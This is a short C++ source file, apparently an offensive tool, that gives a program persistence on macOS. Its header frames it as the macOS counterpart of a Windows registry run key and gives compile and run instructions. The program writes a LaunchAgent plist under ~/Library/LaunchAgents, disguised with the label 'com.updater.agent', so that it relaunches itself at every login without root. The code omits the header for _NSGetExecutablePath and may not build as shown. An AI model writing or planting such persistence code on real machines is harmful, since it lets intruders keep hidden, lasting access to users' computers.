// ============================================================
// persist_launchagent.cpp — HKCU equivalent: ~/Library/LaunchAgents
// ------------------------------------------------------------
// Compile: clang++ -O2 -o persist persist_launchagent.cpp -framework CoreFoundation
// Run:    ./persist   (writes plist for its own path)
// Note:   No root required. LaunchAgent runs at user login.
// ============================================================
#include <cstdio>
#include <cstdlib>
#include <fstream>
#include <string>

int main() {
    char path[4096];
    uint32_t size = sizeof(path);
    _NSGetExecutablePath(path, &size);

    std::string plist = R"(<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
  "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.updater.agent</string>
    <key>ProgramArguments</key>
    <array><string>)" + std::string(path) + R"(</string></array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>)";

    const char* home = getenv("HOME");
    std::string out = std::string(home) +
        "/Library/LaunchAgents/com.updater.agent.plist";
    std::ofstream f(out);
    f << plist;
    printf("wrote %s\n", out.c_str());
    return 0;
}
